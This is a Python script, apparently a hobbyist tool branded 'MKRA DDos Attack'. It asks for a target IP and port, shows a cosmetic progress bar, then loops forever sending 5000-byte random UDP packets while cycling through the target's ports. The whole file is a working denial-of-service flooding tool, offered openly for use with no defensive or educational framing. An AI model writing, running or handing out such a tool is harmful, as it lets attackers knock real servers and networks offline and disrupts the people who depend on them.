import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(5000)
#############

os.system("clear")
os.system("figlet MKRA DDos Attack")
print()
print("Author   : mkra")
print("github   :https://github.com/soreungmakara2/Makra ")
print("CSDN     : 😊😊😊😊😊😊😊😊😊😊😊🇰🇭")
print()
ip = input("IP Target : ")
port = input("Port       : ")
port = int(port)

os.system("clear")
os.system("figlet MKRA DDos Attack")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 8080

